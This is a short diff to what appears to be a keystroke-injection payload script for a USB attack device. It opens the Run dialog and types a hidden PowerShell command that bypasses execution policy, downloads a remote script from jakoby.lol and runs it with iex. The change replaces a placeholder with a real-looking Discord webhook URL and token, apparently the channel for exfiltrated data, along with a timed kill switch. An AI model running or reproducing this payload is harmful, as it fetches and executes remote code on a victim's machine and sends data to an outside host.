@@ -21,5 +21,5 @@ REM     $dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
+STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://discordapp.com/api/webhooks/1456027297806159964/d7E-B9nqYpa5KV4ppTN40JI-W_hadB7ElmfqjIZirayjbBwOIXO1dNrdov7j7qqlnGKB';$log='08:00 pm';$ks='3/1/2026 9:00:00 PM';iwr 'https://jakoby.lol/m2m' | iex"
 ENTER
